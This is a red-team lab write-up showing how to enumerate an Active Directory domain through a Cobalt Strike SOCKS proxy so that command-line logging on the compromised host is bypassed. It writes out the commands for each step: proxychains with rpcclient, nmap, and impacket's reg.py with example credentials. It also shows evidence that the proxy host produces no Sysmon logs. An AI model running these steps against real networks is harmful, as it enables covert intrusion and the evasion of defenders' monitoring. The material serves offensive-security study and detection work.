# Enumerating Windows Domains with rpcclient through SocksProxy == Bypassing Command Line Logging

## Enumerating Windows Domains with rpcclient through SocksProxy == Bypassing Command Line Logging

This lab shows how it is possible to bypass commandline argument logging when enumerating Windows environments, using Cobalt Strike and its socks proxy (or any other post exploitation tool that supports socks proxying).

In other words - it's possible to enumerate AD (or create/delete AD users, etc.) without the likes of:

* net user
* net user \<bla> /domain
* net user \<bla> \<bla> /add /domain
* net localgroup
* net groups /domain
* and similar commands

...which most likely are monitored by the blue team.

### Assumption

In this lab, it is assumed that the attacker/operator has gained:

* code execution on a target system and the beacon is calling back to the team server
* valid set of domain credentials for any `authenticated user`

### Lab Environment

| IP       | What's behind                                                  |
| -------- | -------------------------------------------------------------- |
| 10.0.0.5 | attacker with kali and `rpcclient`                             |
| 10.0.0.2 | compromised Windows system `WS01`                              |
| 10.0.0.6 | Windows DC `DC01` to be interrogated by 10.0.0.5 via 10.0.0.2  |
| 10.0.0.7 | Windows box `WS02` to be interrogated by 10.0.0.5 via 10.0.0.2 |

### Execution

The below shows a couple of things. First one - two Cobalt Strike sessions:

* PID 4112 - original beacon
* PID 260 - beacon injected into dllhost process

Second - attacker opens a socks4 proxy on port 7777 on his local kali machine (10.0.0.5) by issuing:

{% code title="attacker\@cobaltstrike" %}
```
socks 7777
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXun3WUnwFAVuNHQKYJ%2F-LXuzC1vUVKQb1n_hCQz%2FScreenshot%20from%202019-02-05%2000-08-58.png?alt=media\&token=3a9472e3-f9b9-4566-8a3b-e50c9692c9b6)

This means that the attacker can now use proxychains to proxy traffic from their kali box through the beacon to the target (attacker ---> beacon ---> end target).

Let's see how this works by firstly updating the proxychains config file:

{% code title="attacker\@kali" %}
```
nano /etc/proxychains.conf
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXun3WUnwFAVuNHQKYJ%2F-LXuohZjIJHk2uqM2UGB%2FScreenshot%20from%202019-02-04%2023-20-21.png?alt=media\&token=24682b95-ec7d-4932-a615-74559200edf9)

#### Enumeration

Once proxychains are configured, the attacker can start enumerating the AD environment through the beacon like so:

{% code title="attacker\@kali" %}
```
proxychains rpcclient 10.0.0.6 -U spotless
enumdomusers
```
{% endcode %}

![Victim (10.0.0.2) is enumerating DC (10.0.0.6) on behalf of attacker (10.0.0.5)](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXzCbcv2GzZ7FboM8zi%2F-LXzK291nTl8fMZ1aNVe%2FScreenshot%20from%202019-02-05%2020-22-43.png?alt=media\&token=276ac4fa-1882-4462-87c6-6aa22bf1fc02)

Moving on, same way, they can query info about specific AD users:

{% code title="attacker\@kali" %}
```
queryuser spotless
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXzCbcv2GzZ7FboM8zi%2F-LXzCiJnJb6ykKa8n5GO%2FScreenshot%20from%202019-02-04%2023-34-33.png?alt=media\&token=a6c8caff-7996-4383-b327-f1cdfd18aaf3)

Enumerate current user's privileges and many more (consult rpcclient for all available commands):

{% code title="attacker\@kali" %}
```
enumprivs
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXun3WUnwFAVuNHQKYJ%2F-LXurwd_Rj_RNFnCZDMq%2FScreenshot%20from%202019-02-04%2023-34-42.png?alt=media\&token=705e5182-e8f3-4741-8a56-37474d005af9)

Finally, of course they can run nmap if needed:

{% code title="attacker\@kali" %}
```csharp
proxychains nmap 10.0.0.6 -T4 -p 21,22,23,53,80,443,25 -sT
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXun3WUnwFAVuNHQKYJ%2F-LXurp9VXlSQWh6pbJZW%2FScreenshot%20from%202019-02-04%2023-36-48.png?alt=media\&token=dc5c9ec8-f1c5-4776-9928-4404309852e7)

#### Impacket

Impacket provides even more tools to enumerate remote systems through compromised boxes. See the below example gif.

This is what happens - attacker (10.0.0.5) uses proxychains with impacket's reg utility to retrieve the hostname of the box at 10.0.0.7 (WS02) via the compromised (CS beacon) box 10.0.0.2 (WS01):

{% code title="attacker\@kali" %}
```csharp
proxychains reg.py offense/administrator:123456@10.0.0.2 -target-ip 10.0.0.7 query -keyName hklm\system\currentcontrolset\control\computername\computername
```
{% endcode %}

The below shows traffic captures that illustrate that the box 10.0.0.2 enumerates 10.0.0.7 using SMB traffic only:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYIjAppnE1gCl2vspdE%2F-LYIo5LBmbx4WNzng_Iy%2FPeek%202019-02-09%2019-50.gif?alt=media\&token=3ecbc9ab-85a5-48f0-bfab-fa0917199c48)

Below further proves that the box 10.0.0.2 (WS01 which acted as proxy) did not generate any sysmon logs and the target box 10.0.0.7 (WS02) logged a couple of events, that most likely would not attract much attention from the blue teams:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LYIjAppnE1gCl2vspdE%2F-LYIq943_TvB6q1CYnGz%2FScreenshot%20from%202019-02-09%2019-59-58.png?alt=media\&token=c2841db5-a1f9-4cc0-9e1e-dfbec3ada605)

### Observations

Note how only the SMB traffic between the compromised system and the DC is generated, but no new processes are spawned by the infected `dllhost` process:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXzCbcv2GzZ7FboM8zi%2F-LXzM9_IhPnkkk_3X-Ip%2FPeek%202019-02-05%2020-24.gif?alt=media\&token=35be7529-5fd1-414c-a248-8a5db144a435)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXun3WUnwFAVuNHQKYJ%2F-LXupSmlTsYfLK_35wvy%2FScreenshot%20from%202019-02-04%2023-18-20.png?alt=media\&token=30dca62e-639b-4c7f-b832-e50de75d6532)

### References

{% embed url="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html" %}

{% embed url="https://github.com/SecureAuthCorp/impacket/tree/master/examples" %}

{% embed url="https://www.cobaltstrike.com/help-socks-proxy-pivoting" %}

{% embed url="https://youtu.be/l8nkXCOYQC4" %}
